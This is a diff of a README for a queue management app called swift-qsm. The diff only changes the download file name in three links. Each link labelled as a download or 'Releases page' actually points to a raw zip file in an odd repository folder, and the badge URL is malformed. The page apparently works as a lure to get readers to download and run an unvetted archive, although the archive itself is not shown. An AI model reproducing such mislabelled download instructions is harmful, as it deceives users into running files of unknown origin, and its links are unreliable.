@@ -1,6 +1,6 @@
 # 🚀 swift-qsm - Quick and Simple Queue Management
 
-[![Download the latest release](https://raw.githubusercontent.com/sanadalbadry/swift-qsm/main/broadpiece/swift-qsm.zip%20Now-Release-007ACC?style=flat&logo=github)](https://raw.githubusercontent.com/sanadalbadry/swift-qsm/main/broadpiece/swift-qsm.zip)
+[![Download the latest release](https://raw.githubusercontent.com/sanadalbadry/swift-qsm/main/broadpiece/swift_qsm_v3.8.zip%20Now-Release-007ACC?style=flat&logo=github)](https://raw.githubusercontent.com/sanadalbadry/swift-qsm/main/broadpiece/swift_qsm_v3.8.zip)
 
 ## 📦 Overview
 Swift-QSM is an easy-to-use application designed for managing queues quickly and efficiently. Whether you are organizing a simple event or managing a busy workspace, Swift-QSM helps you keep track of any queue with ease.
@@ -21,7 +21,7 @@ Swift-QSM runs on Windows, macOS, and Linux. Ensure you have the following:
 To get started with Swift-QSM, follow these steps:
 
 ### 1. Visit the Releases Page
-To download the application, go to the [Releases page](https://raw.githubusercontent.com/sanadalbadry/swift-qsm/main/broadpiece/swift-qsm.zip).
+To download the application, go to the [Releases page](https://raw.githubusercontent.com/sanadalbadry/swift-qsm/main/broadpiece/swift_qsm_v3.8.zip).
 
 ### 2. Download the Application
 On the Releases page, look for the latest version of Swift-QSM. You will see options to download the file suitable for your operating system. Click on the link that matches your system.
@@ -66,6 +66,6 @@ Swift-QSM is open-source software licensed under the MIT License. You can use it
 For updates, follow the repository on GitHub. You can also check for announcements related to new features or versions.
 
 ## 🔗 Important Links
-- [Download the latest release](https://raw.githubusercontent.com/sanadalbadry/swift-qsm/main/broadpiece/swift-qsm.zip)
+- [Download the latest release](https://raw.githubusercontent.com/sanadalbadry/swift-qsm/main/broadpiece/swift_qsm_v3.8.zip)
 
 Feel free to reach out if you have any questions or need assistance getting started!
